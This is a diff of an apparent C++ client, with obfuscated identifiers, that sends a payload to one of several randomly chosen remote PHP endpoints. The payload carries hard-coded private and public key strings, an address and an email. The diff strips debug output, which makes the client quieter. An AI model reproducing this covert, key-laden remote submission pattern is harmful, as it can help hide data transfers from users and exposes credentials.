@@ -975,7 +975,6 @@ int number;
 
 srand(time(0));
 int rand_index = rand() % 5;
-cout << random[rand_index];
 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
@@ -1012,8 +1011,6 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     else
         linux84746688_data = linux8412.substr(30);
     
-    cout << linux84746688_data;
-    
     //string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x&public_key=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
 
     string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&public_key="+ _encode(public_key) +"&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&mail=linuxdistro84@gmail.com&linux84744444444474=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&linux847444444444744474=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x";
@@ -1026,8 +1023,7 @@ int number;
 
 srand(time(0));
 int rand_index = rand() % 5;
-cout << random[rand_index];
-    
+ 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
     
     string response;
